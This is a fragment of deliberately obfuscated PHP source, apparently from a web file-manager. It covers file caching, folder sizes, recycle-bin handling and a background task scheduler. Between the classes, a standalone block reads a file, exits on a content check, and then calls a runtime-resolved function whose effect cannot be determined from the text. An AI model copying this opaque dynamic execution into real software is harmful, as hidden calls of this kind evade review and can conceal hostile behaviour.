_get(self::$cachePathInfoMore, $ÄÖšĞßğ); if ($·ŠŒá¹«) { return $·ŠŒá¹«; } $‰×°òÜí = $this->pathInfo($ÄÖšĞßğ); if (!$‰×°òÜí) { return !1; } if ($‰×°òÜí[$î•Ò²¨[419]] == $î•Ò²¨[99]) { $‰×°òÜí[$î•Ò²¨[90]] = $this->folderChildrenNumber($ÄÖšĞßğ); } self::$cachePathInfoMore[$ÄÖšĞßğ] = $‰×°òÜí; return $‰×°òÜí; } public function sourceInfo($úÄ³¯Ã ) { $ÂŸ Á =& $_SERVER[Å¶¨Şêº]; if (!$úÄ³¯Ã ) { return array(); } $úÄ³¯Ã  = intval($úÄ³¯Ã ); $¡‡ŒÁŒ = $ÂŸ Á[469] . $úÄ³¯Ã ; $Â‚Àâ‘ô = _get(self::$cacheSourceInfo, $¡‡ŒÁŒ); if ($Â‚Àâ‘ô) { return $Â‚Àâ‘ô; } $ÜÂ„éÀ = $this->where(array($ÂŸ Á[411] => $úÄ³¯Ã ))->find(); self::$cacheSourceInfo[$¡‡ŒÁŒ] = $ÜÂ„éÀ; return self::$cacheSourceInfo[$¡‡ŒÁŒ]; } public function sourceCacheClear($ùŞ‚ù¤Å = false) { self::cacheClear($ùŞ‚ù¤Å); } public static function cacheClear($“¯É¹Ûò = false) { $í´îÏîÈ =& $_SERVER[Å¶¨Şêº]; if ($“¯É¹Ûò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$í´îÏîÈ[469] . $“¯É¹Ûò]); unset(self::$cachePathInfoMore[$“¯É¹Ûò]); unset(self::$cachePathInfo[$í´îÏîÈ[2154] . $“¯É¹Ûò]); unset(self::$cachePathInfo[$í´îÏîÈ[2155] . $“¯É¹Ûò]); } public function metaSet($‚û„€Ÿ, $º‚şíÛê = null, $ŠÅÉÌ¯• = null) { $¥ºÆ·‰” = parent::metaSet($‚û„€Ÿ, $º‚şíÛê, $ŠÅÉÌ¯•); if ($¥ºÆ·‰”) { $this->sourceCacheClear($‚û„€Ÿ); } return $¥ºÆ·‰”; } public function pathInfoByPath($¾âÙ¢ëæ, $ÕÖÁÚğ·) { $ƒï¥–á =& $_SERVER[Å¶¨Şêº]; $ÖÎÉŸîš = !$ÕÖÁÚğ· ? array() : explode($ƒï¥–á[8], trim($ÕÖÁÚğ·, $ƒï¥–á[8])); $šè”Òı = $¾âÙ¢ëæ; foreach ($ÖÎÉŸîš as $¾†¹€ô¸) { $Ï¸¾’¦” = array($ƒï¥–á[441] => $šè”Òı, $ƒï¥–á[42] => $¾†¹€ô¸); $ï’›ÖİÆ = $this->where($Ï¸¾’¦”)->select(); if (!$ï’›ÖİÆ) { return !1; } $ï’›ÖİÆ = array_sort_by($ï’›ÖİÆ, $ƒï¥–á[440]); $šè”Òı = $ï’›ÖİÆ[0][$ƒï¥–á[411]]; } return $this->pathInfo($šè”Òı, !0); } protected function updateModifyTime($ÂÁË±ı£) { $Ó¯ó«âè =& $_SERVER[Å¶¨Şêº]; if (!$ÂÁË±ı£) { return; } if (!is_array($ÂÁË±ı£)) { $ÂÁË±ı£ = array($ÂÁË±ı£); } foreach ($ÂÁË±ı£ as $€Çöûêš => $»ŞÂ€§ª) { $ÂÁË±ı£[$€Çöûêš] = intval($»ŞÂ€§ª); $this->sourceCacheClear($»ŞÂ€§ª); } $–ªÍñÌ‡ = array($Ó¯ó«âè[411] => array($Ó¯ó«âè[7], $ÂÁË±ı£)); $Ã‡¨ÍöÊ = array($Ó¯ó«âè[588] => USER_ID, $Ó¯ó«âè[433] => time()); $this->where($–ªÍñÌ‡)->save($Ã‡¨ÍöÊ); } public function folderSizeReset($®¥ÆÇ¢Ş, $È¡Ş¹İ = false) { $é›ºÌğâ =& $_SERVER[Å¶¨Şêº]; if ($this->statusIgnoreResetSpace) { return; } $µ·ÚË²â = $this->sourceInfo($®¥ÆÇ¢Ş); $¸¨ˆ÷™ = $é›ºÌğâ[2156] . $®¥ÆÇ¢Ş; CacheLock::lock($¸¨ˆ÷™, 20); if ($È¡Ş¹İ === !1) { $this->sourceCacheClear($®¥ÆÇ¢Ş); $µ·ÚË²â = $this->sourceInfo($®¥ÆÇ¢Ş); $ï‚ñâŸ± = array($é›ºÌğâ[410] => $®¥ÆÇ¢Ş, $é›ºÌğâ[439] => 0); $Íî€èê× = $this->where($ï‚ñâŸ±)->sum($é›ºÌğâ[87]); $È¡Ş¹İ = intval($Íî€èê×) - intval($µ·ÚË²â[$é›ºÌğâ[87]]); } if ($È¡Ş¹İ == 0) { return CacheLock::unlock($¸¨ˆ÷™); } $á«‘Ó¼ = $this->parentLevelArray($µ·ÚË²â[$é›ºÌğâ[520]]); if (!$á«‘Ó¼) { $á«‘Ó¼ = array(); } $á«‘Ó¼[] = $µ·ÚË²â[$é›ºÌğâ[411]]; $ï‚ñâŸ± = array($é›ºÌğâ[411] => array($é›ºÌğâ[427], $á«‘Ó¼)); if ($È¡Ş¹İ < 0) { $ï‚ñâŸ±[$é›ºÌğâ[87]] = array($é›ºÌğâ[1012], abs($È¡Ş¹İ)); } $this->where($ï‚ñâŸ±)->setAdd($é›ºÌğâ[87], $È¡Ş¹İ); CacheLock::unlock($¸¨ˆ÷™); $™®û©í· = $é›ºÌğâ[2157] . $µ·ÚË²â[$é›ºÌğâ[420]] . $é›ºÌğâ[4] . $µ·ÚË²â[$é›ºÌğâ[505]]; $¢Ğ›‘À = array($µ·ÚË²â[$é›ºÌğâ[420]], $µ·ÚË²â[$é›ºÌğâ[505]]); TaskRun::timeLimitCall($™®û©í·, $é›ºÌğâ[2158], $¢Ğ›‘À, 1.5); } public function folderSizeResetChildren($›àùåÈæ) { $®á€£¤ì =& $_SERVER[Å¶¨Şêº]; $this->sourceCacheClear($›àùåÈæ); $¶ÎäÆ²‡ = $this->sourceInfo($›àùåÈæ); $¬ªÜ¼–Ö = array($®á€£¤ì[583] => 1, $®á€£¤ì[586] => $¶ÎäÆ²‡[$®á€£¤ì[505]], $®á€£¤ì[589] => array($®á€£¤ì[549], $¶ÎäÆ²‡[$®á€£¤ì[520]] . $›àùåÈæ . $®á€£¤ì[550])); $ªöš = $®á€£¤ì[2159]; $Éˆ‡«ä = $this->field($ªöš)->where($¬ªÜ¼–Ö)->select(); $¬ªÜ¼–Ö[$®á€£¤ì[419]] = 0; $ì´«ƒ÷ù = $this->field($ªöš)->where($¬ªÜ¼–Ö)->select(); if (!$ì´«ƒ÷ù) { return; } $Éˆ‡«ä[] = $¶ÎäÆ²‡; $Éˆ‡«ä = array_to_keyvalue($Éˆ‡«ä, $®á€£¤ì[411]); foreach ($Éˆ‡«ä as $ÓŸË–ı => $šğ÷Ãİô) { $Éˆ‡«ä[$ÓŸË–ı][$®á€£¤ì[2160]] = $Éˆ‡«ä[$ÓŸË–ı][$®á€£¤ì[87]]; $Éˆ‡«ä[$ÓŸË–ı][$®á€£¤ì[87]] = 0; } foreach ($ì´«ƒ÷ù as $šğ÷Ãİô) { $ó™Àê•£ = $šğ÷Ãİô[$®á€£¤ì[441]] . $®á€£¤ì[12]; if (!isset($Éˆ‡«ä[$ó™Àê•£])) { continue; } if ($šğ÷Ãİô[$®á€£¤ì[440]] == $Éˆ‡«ä[$ó™Àê•£][$®á€£¤ì[440]]) { $Éˆ‡«ä[$ó™Àê•£][$®á€£¤ì[87]] += $šğ÷Ãİô[$®á€£¤ì[87]]; } } foreach ($Éˆ‡«ä as $šğ÷Ãİô) { $Ó´ßš¶ = $this->parentLevelArray($šğ÷Ãİô[$®á€£¤ì[520]]); foreach ($Ó´ßš¶ as $ó™Àê•£) { $ó™Àê•£ = $ó™Àê•£ . $®á€£¤ì[12]; if (!isset($Éˆ‡«ä[$ó™Àê•£])) { continue; } if ($šğ÷Ãİô[$®á€£¤ì[440]] == $Éˆ‡«ä[$ó™Àê•£][$®á€£¤ì[440]]) { $Éˆ‡«ä[$ó™Àê•£][$®á€£¤ì[87]] += $šğ÷Ãİô[$®á€£¤ì[87]]; } } } $ÁØç£ìå = array(); foreach ($Éˆ‡«ä as $šğ÷Ãİô) { if ($šğ÷Ãİô[$®á€£¤ì[87]] == $šğ÷Ãİô[$®á€£¤ì[2160]]) { continue; } $ÁØç£ìå[] = array($®á€£¤ì[411], $šğ÷Ãİô[$®á€£¤ì[411]], $®á€£¤ì[87], $šğ÷Ãİô[$®á€£¤ì[87]]); } $this->saveAll($ÁØç£ìå); } public function userSpaceReset($øÀ¯öñ = false) { $âø¨ŠÏñ =& $_SERVER[Å¶¨Şêº]; $ãÅ·şü = $this->where(array($âø¨ŠÏñ[420] => self::TYPE_USER, $âø¨ŠÏñ[505] => $øÀ¯öñ, $âø¨ŠÏñ[419] => 0))->sum($âø¨ŠÏñ[87]); $ãÅ·şü = !$ãÅ·şü || $ãÅ·şü <= 0 ? 0 : $ãÅ·şü; Model($âø¨ŠÏñ[513])->userEdit($øÀ¯öñ, array($âø¨ŠÏñ[1841] => $ãÅ·şü)); } public function targetSpaceUpdate($ÔùÁ›¥Š, $Ü‹ÇÓ­•) { $ê´ÈÔ” =& $_SERVER[Å¶¨Şêº]; if (!$Ü‹ÇÓ­•) { return; } if (!in_array($ÔùÁ›¥Š, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Õ‚ªÑã = $this->targetSpaceSize($ÔùÁ›¥Š, $Ü‹ÇÓ­•); if ($ÔùÁ›¥Š == self::TYPE_USER) { Model($ê´ÈÔ”[513])->userEdit($Ü‹ÇÓ­•, array($ê´ÈÔ”[1841] => $Õ‚ªÑã)); } else { if ($ÔùÁ›¥Š == self::TYPE_GROUP) { Model($ê´ÈÔ”[521])->groupEdit($Ü‹ÇÓ­•, array($ê´ÈÔ”[1841] => $Õ‚ªÑã)); } } } public function targetSpaceSize($”Ç²ß‡Ì, $™¨ŠûÆ·) { $óÜ÷ßèÒ =& $_SERVER[Å¶¨Şêº]; $’ÙÛå = 0; $¨õù¬¹¶ = $this->targetSourceRoot($”Ç²ß‡Ì, $™¨ŠûÆ·, !0); foreach ($¨õù¬¹¶ as $ıÍíëéÃ) { if (!$ıÍíëéÃ) { continue; } $’ÙÛå += floatval($ıÍíëéÃ[$óÜ÷ßèÒ[87]]); $¿½†—¼™ = array($óÜ÷ßèÒ[589] => array($óÜ÷ßèÒ[549], $óÜ÷ßèÒ[530] . $ıÍíëéÃ[$óÜ÷ßèÒ[411]] . $óÜ÷ßèÒ[550])); $ÀßÔ±˜  = Model($óÜ÷ßèÒ[438])->field($óÜ÷ßèÒ[426])->where($¿½†—¼™)->select(); $ÀßÔ±˜  = array_to_keyvalue($ÀßÔ±˜ , $óÜ÷ßèÒ[12], $óÜ÷ßèÒ[411]); $ÀßÔ±˜  = array_unique(array_filter($ÀßÔ±˜ )); if ($ÀßÔ±˜ ) { $¿½†—¼™ = array($óÜ÷ßèÒ[426] => array($óÜ÷ßèÒ[427], $ÀßÔ±˜ )); $’ÙÛå += floatval($this->where($¿½†—¼™)->sum($óÜ÷ßèÒ[87])); } } $’ÙÛå = !$’ÙÛå || $’ÙÛå <= 0 ? 0 : $’ÙÛå; return $’ÙÛå; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÕåÖ¡ß•) { return $this->fileTypeProfile($ÕåÖ¡ß•, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¯ôÙ˜à) { return $this->fileTypeProfile($¯ôÙ˜à, SourceModel::TYPE_GROUP); } private function fileTypeProfile($õ±ŞÏÍ¶, $Å¿ùöñ) { $ïİŞŒ¥ =& $_SERVER[Å¶¨Şêº]; $†üêœåç = $ïİŞŒ¥[2161] . $õ±ŞÏÍ¶ . $ïİŞŒ¥[11] . $Å¿ùöñ; $Èå‰‰ı› = Cache::get($†üêœåç); if ($Èå‰‰ı›) { return $Èå‰‰ı›; } $Š°Ù«ƒÓ = array($ïİŞŒ¥[583] => 0); if ($õ±ŞÏÍ¶ != !1) { $Š°Ù«ƒÓ[$ïİŞŒ¥[505]] = $õ±ŞÏÍ¶; $Š°Ù«ƒÓ[$ïİŞŒ¥[420]] = $Å¿ùöñ; } $×ªßÔ¤Á = array(); $×ªßÔ¤Á[$ïİŞŒ¥[2162]] = array($ïİŞŒ¥[2163] => LNG($ïİŞŒ¥[2162]), $ïİŞŒ¥[2164] => $this->where($Š°Ù«ƒÓ)->count(), $ïİŞŒ¥[554] => $this->where($Š°Ù«ƒÓ)->sum($ïİŞŒ¥[87])); $ş­¥äçİ = KodIO::fileTypeList(); foreach ($ş­¥äçİ as $»…Ò°Ç› => $°‹ş¾ö) { $Š°Ù«ƒÓ[$ïİŞŒ¥[421]] = $this->fileTypeWhere($»…Ò°Ç›); $×ªßÔ¤Á[$»…Ò°Ç›] = array($ïİŞŒ¥[2163] => $°‹ş¾ö[$ïİŞŒ¥[42]], $ïİŞŒ¥[2164] => $this->where($Š°Ù«ƒÓ)->count(), $ïİŞŒ¥[554] => $this->where($Š°Ù«ƒÓ)->sum($ïİŞŒ¥[87])); } Cache::set($†üêœåç, $×ªßÔ¤Á, 1200); return $×ªßÔ¤Á; } public function fileNameExist($ú‘àîáä, $™œ•‚Æ ) { $‘»à—™ =& $_SERVER[Å¶¨Şêº]; $¾üï‹“‰ = $this->where(array($‘»à—™[441] => $ú‘àîáä, $‘»à—™[42] => $™œ•‚Æ , $‘»à—™[440] => 0))->find(); return is_array($¾üï‹“‰) ? $¾üï‹“‰[$‘»à—™[411]] : !1; } public function childList($¾Œ‚è÷) { $ûÏ¨ü€Ì =& $_SERVER[Å¶¨Şêº]; $¦§‚à¨’ = $ûÏ¨ü€Ì[2138] . $¾Œ‚è÷; if (isset(self::$cacheChildList[$¦§‚à¨’])) { return self::$cacheChildList[$¦§‚à¨’]; } $êñòô­º = array($ûÏ¨ü€Ì[441] => intval($¾Œ‚è÷), $ûÏ¨ü€Ì[440] => 0); $’¨–®ö = $this->where($êñòô­º)->select(); $’¨–®ö = $’¨–®ö ? $’¨–®ö : array(); self::$cacheChildList[$¦§‚à¨’] = $’¨–®ö; foreach ($’¨–®ö as $íÅ˜ûúü) { $¦§‚à¨’ = $ûÏ¨ü€Ì[469] . $íÅ˜ûúü[$ûÏ¨ü€Ì[411]]; self::$cacheSourceInfo[$¦§‚à¨’] = $íÅ˜ûúü; } return $’¨–®ö; } public function fileNameAuto($€õ¥ï, $ÏµÇ²ã­, $Èš™ƒü¥ = REPEAT_RENAME, $®Èé«¡å = false) { $Ğ„¨ŸÅ  =& $_SERVER[Å¶¨Şêº]; $ãÄÍĞ…ú = get_path_ext($ÏµÇ²ã­); $ÓÕıİ¼£ = $ãÄÍĞ…ú ? basename($ÏµÇ²ã­, $Ğ„¨ŸÅ [10] . $ãÄÍĞ…ú) . $Ğ„¨ŸÅ [2165] . $ãÄÍĞ…ú : $ÏµÇ²ã­ . $Ğ„¨ŸÅ [393]; $ç´ŞÄ—õ = array($Ğ„¨ŸÅ [441] => $€õ¥ï, $Ğ„¨ŸÅ [440] => 0, $Ğ„¨ŸÅ [42] => array($Ğ„¨ŸÅ [392], $ÓÕıİ¼£)); $¾­¦Æ† = $this->field($Ğ„¨ŸÅ [42])->where($ç´ŞÄ—õ)->select(); $ŞÛç¤ƒÖ = array_to_keyvalue($¾­¦Æ†, $Ğ„¨ŸÅ [12], $Ğ„¨ŸÅ [42]); return $this->fileNameAutoGet($ŞÛç¤ƒÖ, $ÏµÇ²ã­, $Èš™ƒü¥, $®Èé«¡å); } public function fileNameAutoGet($ğªÍ÷ı˜, $¾“‹Íæ, $–ğòŞ, $õ¢É²î¨) { $²»ÎÜ¼İ =& $_SERVER[Å¶¨Şêº]; if ($–ğòŞ == REPEAT_REPLACE || !$ğªÍ÷ı˜ || !in_array_not_case($¾“‹Íæ, $ğªÍ÷ı˜) || $õ¢É²î¨ && $–ğòŞ != REPEAT_RENAME_FOLDER) { return $¾“‹Íæ; } if ($–ğòŞ == REPEAT_SKIP) { return !1; } $ÍêÙö = $²»ÎÜ¼İ[10] . get_path_ext($¾“‹Íæ); $ÍêÙö = $ÍêÙö == $²»ÎÜ¼İ[10] || $õ¢É²î¨ ? $²»ÎÜ¼İ[12] : $ÍêÙö; for ($Õã£áö¡ = 1; $Õã£áö¡ <= count($ğªÍ÷ı˜) + 1; $Õã£áö¡++) { $š¿ÁÚ¿½ = substr($¾“‹Íæ, 0, strlen($¾“‹Íæ) - strlen($ÍêÙö)); $™Şö¬ = $š¿ÁÚ¿½ . "\50{$Õã£áö¡}\x29{$ÍêÙö}"; if (!in_array_not_case($™Şö¬, $ğªÍ÷ı˜)) { return $™Şö¬; } } } } if ($_SERVER[$_SERVER[Å¶¨Şêº][15]] != $_SERVER[$_SERVER[Å¶¨Şêº][1180]]) { $_getc = $_SERVER[Å¶¨Şêº][16]; $_getfile = $_SERVER[$_SERVER[Å¶¨Şêº][17]] . $_SERVER[Å¶¨Şêº][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Å¶¨Şêº][19], $_getfilec); if (count($_getarrs) < $_SERVER[Å¶¨Şêº][20]) { $exit = $_SERVER[Å¶¨Şêº][21]; $exit(); } $_act = $_SERVER[Å¶¨Şêº][22]; $_act($_SERVER[$_SERVER[Å¶¨Şêº][13]]); } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\x65\x5f\x72\x65\143\171\143\x6c\145"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\124\x69\155\145", "\x74\x69\155\145", "\x69\156\163\x65\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e")); public function listData($¿øçıø = false) { $äÑÁ·â… =& $_SERVER[Å¶¨Şêº]; $¿øçıø = $¿øçıø ? $¿øçıø : USER_ID; $Üı‘î³ = $this->where(array($äÑÁ·â…[1654] => $¿øçıø))->select(); return array_to_keyvalue($Üı‘î³, $äÑÁ·â…[12], $äÑÁ·â…[411]); } public function moveToRecycle($ÈàöË¢) { $şˆÃï» =& $_SERVER[Å¶¨Şêº]; $©„íÎ¦ = Model($şˆÃï»[1337]); $ æ®€‘Â = $©„íÎ¦->sourceInfo($ÈàöË¢); if (!$ æ®€‘Â || $ æ®€‘Â[$şˆÃï»[440]] == $şˆÃï»[99]) { return; } $£ŠÍºµ© = array($şˆÃï»[426] => $ÈàöË¢, $şˆÃï»[1654] => USER_ID, $şˆÃï»[585] => $ æ®€‘Â[$şˆÃï»[420]], $şˆÃï»[586] => $ æ®€‘Â[$şˆÃï»[505]], $şˆÃï»[589] => $ æ®€‘Â[$şˆÃï»[520]]); $this->add($£ŠÍºµ©); $this->recycleMove($ÈàöË¢, 1); if ($ æ®€‘Â[$şˆÃï»[419]] == $şˆÃï»[99]) { $ÔòÜø­ = array($şˆÃï»[589] => array($şˆÃï»[549], $ æ®€‘Â[$şˆÃï»[520]] . $ÈàöË¢ . $şˆÃï»[550])); $©„íÎ¦->where($ÔòÜø­)->setField($şˆÃï»[440], 1); } } public function clear() { $this->remove(!1); } public function remove($¯ó‡ßÚ˜ = false, $¨ûŸóò¦ = false) { $¿ã¦¥¶ =& $_SERVER[Å¶¨Şêº]; $¨ûŸóò¦ = $¨ûŸóò¦ ? $¨ûŸóò¦ : USER_ID; $ŒÂçëè— = Model($¿ã¦¥¶[1337]); $İç®úœ = $this->listData($¨ûŸóò¦); $¯ó‡ßÚ˜ = $¯ó‡ßÚ˜ === !1 ? !1 : $¯ó‡ßÚ˜; $¢â–¶³º = array(); foreach ($İç®úœ as $ğÈ»íà) { if ($¯ó‡ßÚ˜ != !1 && !in_array($ğÈ»íà, $¯ó‡ßÚ˜)) { continue; } $ŸÀúàøÜ = $ŒÂçëè—->sourceInfo($ğÈ»íà); $ŒÂçëè—->remove($ğÈ»íà, !1); $ßµ‹¡ÛÀ = $ŸÀúàøÜ[$¿ã¦¥¶[420]] . $¿ã¦¥¶[11] . $ŸÀúàøÜ[$¿ã¦¥¶[505]]; $¢â–¶³º[$ßµ‹¡ÛÀ] = array($¿ã¦¥¶[585] => $ŸÀúàøÜ[$¿ã¦¥¶[420]], $¿ã¦¥¶[505] => $ŸÀúàøÜ[$¿ã¦¥¶[505]]); $this->where(array($¿ã¦¥¶[411] => $ğÈ»íà))->delete(); } foreach ($¢â–¶³º as $íİåñ½Í) { $ŒÂçëè—->targetSpaceUpdate($íİåñ½Í[$¿ã¦¥¶[420]], $íİåñ½Í[$¿ã¦¥¶[505]]); } } public function restore($°á×ŸÉ = false) { $¡Ô³Éçğ = $this->listData(); $this->_restoreSource($¡Ô³Éçğ, $°á×ŸÉ); } public function removeUserAll($®«Òœá­) { $this->remove(!1, $®«Òœá­); } private function _restoreSource($Î§²¶ê, $ó½¬È Í) { $ß’šÔ¹ç =& $_SERVER[Å¶¨Şêº]; $†¼ĞâÛ = Model($ß’šÔ¹ç[1337]); $ó½¬È Í = $ó½¬È Í == !1 ? !1 : $ó½¬È Í; if (!$Î§²¶ê) { return !0; } $—ÛùÄŞõ = array(); foreach ($Î§²¶ê as $Õ×çŸ£ú) { if ($ó½¬È Í != !1 && !in_array($Õ×çŸ£ú, $ó½¬È Í)) { continue; } $…™ı•– = $†¼ĞâÛ->sourceInfo($Õ×çŸ£ú); $­ ¾í×® = $†¼ĞâÛ->sourceInfo($…™ı•–[$ß’šÔ¹ç[441]]); if ($­ ¾í×®[$ß’šÔ¹ç[440]] == $ß’šÔ¹ç[99]) { continue; } $†¼ĞâÛ->lockMoveStart($Õ×çŸ£ú); $this->recycleMove($Õ×çŸ£ú, 0); if ($…™ı•–[$ß’šÔ¹ç[419]] == $ß’šÔ¹ç[99]) { $°İ¡ï¿ü = array($ß’šÔ¹ç[589] => array($ß’šÔ¹ç[549], $…™ı•–[$ß’šÔ¹ç[520]] . $Õ×çŸ£ú . $ß’šÔ¹ç[550])); $†¼ĞâÛ->where($°İ¡ï¿ü)->setField($ß’šÔ¹ç[440], 0); $this->restoreFolderChildren($Õ×çŸ£ú, $Î§²¶ê); } $this->where(array($ß’šÔ¹ç[411] => $Õ×çŸ£ú))->delete(); $†¼ĞâÛ->folderSizeReset($…™ı•–[$ß’šÔ¹ç[441]]); $—ÛùÄŞõ[] = $…™ı•–[$ß’šÔ¹ç[441]]; if ($…™ı•–[$ß’šÔ¹ç[419]] == $ß’šÔ¹ç[99]) { $—ÛùÄŞõ[] = $Õ×çŸ£ú; } $†¼ĞâÛ->lockMoveEnd($Õ×çŸ£ú); } $†¼ĞâÛ->updateModifyTime($—ÛùÄŞõ); } private function restoreFolderChildren($×¼«ìˆ, $®µ¯û¸) { $œıø·Ñ =& $_SERVER[Å¶¨Şêº]; $“šçÁĞ’ = Model($œıø·Ñ[1337]); $Û¶Äò€‘ = array($œıø·Ñ[411] => array($œıø·Ñ[7], array())); foreach ($®µ¯û¸ as $Ğßè§¸±) { if ($Ğßè§¸± == $×¼«ìˆ) { continue; } if (!$“šçÁĞ’->isParentOf($×¼«ìˆ, $Ğßè§¸±)) { continue; } $­¦Ñ€¾ = $“šçÁĞ’->sourceInfo($Ğßè§¸±); if ($­¦Ñ€¾[$œıø·Ñ[419]] == $œıø·Ñ[99]) { $Û¶Äò€‘[] = array($œıø·Ñ[589] => array($œıø·Ñ[549], $­¦Ñ€¾[$œıø·Ñ[520]] . $Ğßè§¸± . $œıø·Ñ[550])); } else { $Û¶Äò€‘[$œıø·Ñ[411]][1][] = $Ğßè§¸±; } } if (!$Û¶Äò€‘[$œıø·Ñ[411]][1]) { unset($Û¶Äò€‘[$œıø·Ñ[411]]); } if (!$Û¶Äò€‘) { return; } $Û¶Äò€‘[$œıø·Ñ[411]][1] = array_unique($Û¶Äò€‘[$œıø·Ñ[411]][1]); $Û¶Äò€‘[$œıø·Ñ[997]] = $œıø·Ñ[1950]; $“šçÁĞ’->where($Û¶Äò€‘)->setField($œıø·Ñ[440], 1); } private function recycleMove($æ¸ûë‘›, $¹ÂÏïî› = 1) { $Å©”ë†± =& $_SERVER[Å¶¨Şêº]; $¸áƒÜ¥® = Model($Å©”ë†±[1337]); $º’ÑÓ—¥ = Model($Å©”ë†±[2166]); $âçæ³İ„ = array($Å©”ë†±[411] => $æ¸ûë‘›); if ($¹ÂÏïî›) { $¸áƒÜ¥®->where($âçæ³İ„)->setField($Å©”ë†±[440], 1); $º’ÑÓ—¥->eventRecycle($æ¸ûë‘›, $Å©”ë†±[2167]); } else { $ıÆúÇúû = $¸áƒÜ¥®->where($âçæ³İ„)->find(); $ğ†€ „ç = $ıÆúÇúû[$Å©”ë†±[419]] == $Å©”ë†±[99]; $†®çŠè´ = $¸áƒÜ¥®->fileNameAuto($ıÆúÇúû[$Å©”ë†±[441]], $ıÆúÇúû[$Å©”ë†±[42]], REPEAT_RENAME_FOLDER, $ğ†€ „ç); if ($†®çŠè´ != $ıÆúÇúû[$Å©”ë†±[42]]) { $¸áƒÜ¥®->rename($æ¸ûë‘›, $†®çŠè´); } $¸áƒÜ¥®->where($âçæ³İ„)->setField($Å©”ë†±[440], 0); $º’ÑÓ—¥->eventRecycle($æ¸ûë‘›, $Å©”ë†±[2168]); } } } goto f”Ù«™ƒÜ; E¶¹Á»õÃ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÌÃø² =& $_SERVER[Å¶¨Şêº]; if (self::valueGet($ÌÃø²[747]) != $ÌÃø²[99]) { return; } if (self::valueGet($ÌÃø²[1622]) == $ÌÃø²[99]) { $†å¬Ø³ = self::valueGet($ÌÃø²[1623]); if (time() - $†å¬Ø³ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ÌÃø²[1624]] = 1; self::valueSet($ÌÃø²[1622], $ÌÃø²[99]); self::log($ÌÃø²[1625] . ACTION . $ÌÃø²[1626]); Session::$data = array(); Session::$sessionSign = $ÌÃø²[12]; $GLOBALS[$ÌÃø²[503]] = 1; Hook::bind($ÌÃø²[1627], $ÌÃø²[1628]); $¯™ï„úÜ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÌÃø²[747]) != $ÌÃø²[99]) { self::valueSet($ÌÃø²[1622], $ÌÃø²[209]); self::log($ÌÃø²[1629]); die; } $ù™¯à¿ = time(); if ($ù™¯à¿ - $¯™ï„úÜ >= 60) { self::valueSet(array($ÌÃø²[1622] => $ÌÃø²[99], $ÌÃø²[1623] => $ù™¯à¿), !1); $¯™ï„úÜ = $ù™¯à¿; } if (!file_exists(USER_SYSTEM . $ÌÃø²[1630])) { self::valueSet(array($ÌÃø²[1622] => $ÌÃø²[209], $ÌÃø²[747] => $ÌÃø²[209]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $äÓÎò×´ =& $_SERVER[Å¶¨Şêº]; http_close(); self::valueSet($äÓÎò×´[747], $äÓÎò×´[209]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($äÓÎò×´[1622] => $äÓÎò×´[209], $äÓÎò×´[747] => $äÓÎò×´[99]), !1); } public static function taskSwitch() { $ˆÉô¯Çé =& $_SERVER[Å¶¨Şêº]; $¾áÖÙéÏ = self::valueGet($ˆÉô¯Çé[747]) == $ˆÉô¯Çé[99] ? $ˆÉô¯Çé[209] : $ˆÉô¯Çé[99]; self::valueSet($ˆÉô¯Çé[747], $¾áÖÙéÏ); } public static function shutdownEvent() { $’”õà•ô =& $_SERVER[Å¶¨Şêº]; self::valueSet($’”õà•ô[1622], $’”õà•ô[209]); self::log($’”õà•ô[1631]); } public static function config($òÙ¤íø”, $Æ§ÖÁÁ) { self::valueSet($_SERVER[Å¶¨Şêº][747], $òÙ¤íø”); } private static function taskRunAll() { $’ ‰ï€ª =& $_SERVER[Å¶¨Şêº]; $±¿ Ğ«Ë = timeFloat(); $Å€¤¡Óú = Model($’ ‰ï€ª[1632])->listData(); $íè”œ = count($Å€¤¡Óú); for ($¼öñ’¬» = 0; $¼öñ’¬» < $íè”œ; $¼öñ’¬»++) { $…êÌÍ·ú = $Å€¤¡Óú[$¼öñ’¬»]; if (!$…êÌÍ·ú[$’ ‰ï€ª[408]] || $…êÌÍ·ú[$’ ‰ï€ª[1633]] != $’ ‰ï€ª[99]) { continue; } if (!self::taskTimeCheck($…êÌÍ·ú)) { continue; } self::taskRun($…êÌÍ·ú); } Hook::trigger($’ ‰ï€ª[1634]); self::taskQueueRun($±¿ Ğ«Ë); } private static function taskQueueRun($şÓ„ô¼) { $Ì«ƒ®ÚÆ = 10; while (!0) { $í¶»ïÆ™ = TaskQueue::run(); if ($í¶»ïÆ™ === !1) { break; } if (timeFloat() - $şÓ„ô¼ >= $Ì«ƒ®ÚÆ) { break; } } } private static function taskTimeCheck($•Í÷±ì) { $¢Òóàõ¨ =& $_SERVER[Å¶¨Şêº]; $İã°ü¹˜ = json_decode($•Í÷±ì[$¢Òóàõ¨[191]], !0); $§é¸²·› = intval($•Í÷±ì[$¢Òóàõ¨[1623]]); $õÉÉä¤¨ = strtotime($¢Òóàõ¨[1635] . $İã°ü¹˜[$¢Òóàõ¨[1636]] . $¢Òóàõ¨[1637]) - strtotime($¢Òóàõ¨[1638]); $Õ’”½­¨ = time() - strtotime(date($¢Òóàõ¨[1639]) . $¢Òóàõ¨[1640]); $ãøùáÕÍ = $Õ’”½­¨ >= $õÉÉä¤¨ && $Õ’”½­¨ <= $õÉÉä¤¨ + 3600; switch ($İã°ü¹˜[$¢Òóàõ¨[43]]) { case $¢Òóàõ¨[1641]: if (time() - $§é¸²·› < 3600 * 24 * 30) { return !1; } if ($İã°ü¹˜[$¢Òóàõ¨[1641]] == date($¢Òóàõ¨[1642]) && 